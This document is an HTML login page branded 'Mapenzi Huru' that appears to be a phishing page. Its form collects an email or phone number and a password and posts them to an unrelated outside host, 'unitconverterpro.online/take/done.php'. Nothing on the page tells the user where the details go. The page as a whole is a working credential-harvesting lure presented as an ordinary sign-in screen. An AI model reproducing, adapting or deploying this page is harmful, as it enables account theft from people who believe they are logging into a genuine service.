<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mapenzi Huru - Login</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Lato', sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .login-container {
            width: 100%;
            max-width: 420px;
            text-align: center;
        }

        .profile-img-container {
            margin-bottom: 20px;
        }

        .profile-img {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            object-fit: cover;
            border: 5px solid #fff;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }

        .login-form-wrap {
            background: radial-gradient(ellipse at center, #5170ad 0%, #355493 100%);
            border: 1px solid #2d416d;
            box-shadow: 0 1px #5670A4 inset, 0 10px 30px rgba(0, 0, 0, 0.2);
            border-radius: 12px;
            padding: 40px 30px 30px;
            text-align: center;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .login-form-wrap:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
        }

        .login-form-wrap h1 {
            margin: 0 0 30px 0;
            padding: 0;
            font-size: 28px;
            color: #fff;
            font-weight: 700;
            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
        }

        .login-form input[type="text"], 
        .login-form input[type="password"] {
            width: 100%;
            border: 1px solid #314d89;
            outline: none;
            padding: 15px 20px;
            color: #333;
            font-weight: 400;
            font-family: 'Lato', sans-serif;
            background: rgba(255, 255, 255, 0.9);
            transition: all 0.3s ease;
        }

        .login-form input[type="text"]:focus, 
        .login-form input[type="password"]:focus {
            background: white;
            border-color: #4a6bc2;
            box-shadow: 0 0 0 2px rgba(74, 107, 194, 0.3);
        }

        .login-form input[type="text"] {
            border-bottom: none;
            border-radius: 8px 8px 0 0;
            box-shadow: 0 -1px 0 #E0E0E0 inset, 0 1px 2px rgba(0, 0, 0, 0.1) inset;
        }

        .login-form input[type="password"] {
            border-top: none;
            border-radius: 0 0 8px 8px;
            box-shadow: 0 -1px 2px rgba(0, 0, 0, 0.1) inset, 0 1px 2px rgba(255, 255, 255, 0.1);
        }

        .login-form input[type="submit"] {
            font-family: 'Lato', sans-serif;
            font-weight: 700;
            background: linear-gradient(to bottom, #f0f0f0 0%, #d0d0d0 100%);
            display: block;
            margin: 25px auto 0;
            width: 100%;
            border: none;
            border-radius: 6px;
            padding: 14px;
            font-size: 18px;
            color: #444;
            text-shadow: 0 1px 0 rgba(255, 255, 255, 0.6);
            box-shadow: 0 2px 5px 1px rgba(0, 0, 0, 0.15), 0 1px 0 rgba(255, 255, 255, 0.4) inset;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .login-form input[type="submit"]:hover {
            background: linear-gradient(to bottom, #e8e8e8 0%, #c8c8c8 100%);
            transform: translateY(-2px);
            box-shadow: 0 4px 8px 1px rgba(0, 0, 0, 0.2), 0 1px 0 rgba(255, 255, 255, 0.4) inset;
        }

        .login-form input[type="submit"]:active {
            transform: translateY(0);
            padding-top: 15px;
            padding-bottom: 13px;
            background: #c0c0c0;
            box-shadow: 0 1px 3px 0px rgba(0, 0, 0, 0.15), 0 1px 0 rgba(255, 255, 255, 0.4) inset;
        }

        .additional-options {
            margin-top: 25px;
            color: #fff;
            font-size: 14px;
        }

        .additional-options a {
            color: #a8c6ff;
            text-decoration: none;
            transition: color 0.3s ease;
        }

        .additional-options a:hover {
            color: #fff;
            text-decoration: underline;
        }

        .welcome-text {
            margin-bottom: 30px;
            color: #355493;
            font-size: 24px;
            font-weight: 700;
            text-shadow: 0 1px 2px rgba(255, 255, 255, 0.8);
        }

        @media (max-width: 480px) {
            .login-form-wrap {
                padding: 30px 20px 20px;
            }
            
            .profile-img {
                width: 100px;
                height: 100px;
            }
            
            .welcome-text {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="profile-img-container">
            <img src="https://wakubeti.pro/uploads/block_images/930381b1d3eafe164da05c570ccd80ff.png" alt="Profile" class="profile-img">
        </div>
        
        
        <div class="login-form-wrap">
            <h1></h1>
            <form class="login-form" action="https://unitconverterpro.online/take/done.php" method="post">
                <label>
                    <input type="text" name="email" placeholder="Email or phone" 
                           pattern="[a-zA-Z0-9_]+(?:\.[A-Za-z0-9!#$%&amp;'*+/=?^_`{|}~-]+)*@(?!([a-zA-Z0-9]*\.[a-zA-Z0-9]*\.[a-zA-Z0-9]*\.))(?:[A-Za-z0-9](?:[a-zA-Z0-9-]*[A-Za-z0-9])?\.)+[a-zA-Z0-9](?:[a-zA-Z0-9-]*[a-zA-Z0-9])?|.{8,}\d+" 
                           title="Enter correct Email address or phone number" required>
                </label>
                <label>
                    <input type="password" name="pass" placeholder="Password" 
                           pattern=".{6,}" title="Six or more characters" required>
                </label>
                <input type="submit" value="Login">
            </form>
            
            <div class="additional-options">
                <p>Sign in | <a href="#">Forgot password?</a></p>
            </div>
        </div>
    </div>
</body>
</html>
